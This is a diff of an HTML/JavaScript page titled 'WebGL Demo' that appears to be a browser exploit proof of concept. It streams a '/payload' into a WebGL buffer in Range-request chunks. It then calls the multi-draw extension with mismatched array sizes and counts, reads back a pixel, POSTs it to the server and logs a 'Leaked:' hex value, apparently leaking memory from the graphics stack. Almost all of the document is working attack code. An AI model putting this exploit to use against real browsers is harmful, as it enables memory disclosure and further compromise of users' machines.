@@ -3,18 +3,16 @@
     <head>
         <title>WebGL Demo</title>
         <meta charset="utf-8">
-        <script src="https://unpkg.com/de-bruijn-generator/src/index.js"></script>
     </head>
 
     <body>
         <canvas id="glcanvas" width="1" height="1"></canvas>
     </body>
 
-    <script id="vertex" type="x-shader/x-vertex">#version 300 es
+    <script id="vertex" type="x-shader/x-vertex">
         #extension GL_ANGLE_multi_draw : require
-        precision highp float;
-        in vec4 aVertexColor;
-        out vec4 vColor;
+        attribute vec4 aVertexColor;
+        varying highp vec4 vColor;
         void main() {
             gl_Position = vec4(0,0,0,0);
             gl_PointSize = 1.0;
@@ -22,12 +20,10 @@
         }
     </script>
 
-    <script id="fragment" type="x-shader/x-fragment">#version 300 es
-        precision highp float;
-        in vec4 vColor;
-        out vec4 outColor;
+    <script id="fragment" type="x-shader/x-fragment">
+        varying highp vec4 vColor;
         void main() {
-            outColor = vColor;
+            gl_FragColor = vColor;
         }
     </script>
 
@@ -61,19 +57,17 @@
 
         const canvas = document.querySelector('#glcanvas');
         const gl = canvas.getContext('webgl2', {preserveDrawingBuffer: true});
-        const generator = deBruijnGenerator.deBruijn(216, 4, true);
         const ext = gl.getExtension('WEBGL_multi_draw');
-        const regex = /bytes (\d+)-\d+\/\d+/gm;
+        const regex = new RegExp('bytes (\\d+)-\\d+\\/\\d+', '');
 
         function stringToArrayBuffer(str) {
-            let buf = new ArrayBuffer(str.length);
-            let bufView = new Uint8Array(buf);
+            let bufView = new Uint8Array(str.length);
 
             for (let i=0, strLen=str.length; i<strLen; i++) {
                 bufView[i] = str.charCodeAt(i);
             }
 
-            return buf;
+            return bufView;
         }
 
         function convert(buff) {
@@ -98,14 +92,17 @@
             for (let i = 0; i < 1023; ++i) {
                 let oReq = new XMLHttpRequest();
                 oReq.open("GET", "/payload", false);
-                oReq.setRequestHeader("Range", `bytes=${i * 0x200000}-${(i + 1) * 0x200000 - 1}`);
+                let tmp_hdr = `bytes=${i * 0x200000}-${(i + 1) * 0x200000 - 1}`;
+                oReq.setRequestHeader("Range", tmp_hdr);
+                oReq.overrideMimeType("text/plain; charset=x-user-defined");
                 oReq.send(null);
 
                 let arrayBuffer = stringToArrayBuffer(oReq.response);
                 let myHeader = oReq.getResponseHeader("Content-Range");
                 let offset = regex.exec(myHeader);
-                if (arrayBuffer && offset) {
-                    gl.bufferSubData(gl.ARRAY_BUFFER, offset, arrayBuffer);
+                if (offset) {
+                    let tmp_offset = parseInt(offset[1]);
+                    gl.bufferSubData(gl.ARRAY_BUFFER, tmp_offset, arrayBuffer);
                 }
 
             }
@@ -122,16 +119,19 @@
 
             var pixels = new Uint8Array(4);
 
-            let firsts = new Array(1, 1, 1, 1);
-            let counts = new Int32Array([1, 1, 1, 1]);
+            let firsts = new Array(1, 1, 1, 1, 1);
+            let counts = new Int32Array([1, 1, 1, 1, 1]);
             ext.multiDrawArraysWEBGL(gl.POINTS, firsts, 2, counts, 0, firsts.length);
 
+            gl.flush();
+            gl.finish();
+
             gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
-            console.log(pixels);
             let oPost = new XMLHttpRequest();
             oPost.open("POST", "/", false);
-            oPost.send(convert(pixels));
-            console.log(oPost.response);
+            let needle = convert(pixels);
+            oPost.send(needle);
+            console.log("Leaked: " + parseInt(oPost.response).toString(16));
         }
 
         drawScene();
